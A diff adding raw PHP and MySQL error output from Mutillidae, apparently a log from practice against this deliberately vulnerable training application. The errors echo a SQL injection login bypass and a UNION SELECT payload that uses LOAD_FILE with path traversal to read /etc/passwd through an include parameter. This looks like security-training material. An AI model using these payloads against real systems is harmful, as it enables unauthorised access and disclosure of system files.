@@ -1,0 +1,10 @@
+Warning: include(login.php') [function.include]: failed to open stream: No such file or directory in /var/www/mutillidae/index.php on line 469
+
+Warning: include() [function.include]: Failed opening 'login.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/mutillidae/index.php on line 469
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''=' 1 -- ' AND password='' or 1 '=' 1 -- '' at line 1
+
+
+Warning: include(login.php' union select null, null, LOAD_FILE('../../../../../etc/passwd') AS username, null,null--) [function.include]: failed to open stream: No such file or directory in /var/www/mutillidae/index.php on line 469
+
+Warning: include() [function.include]: Failed opening 'login.php' union select null, null, LOAD_FILE('../../../../../etc/passwd') AS username, null,null--' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/mutillidae/index.php on line 469
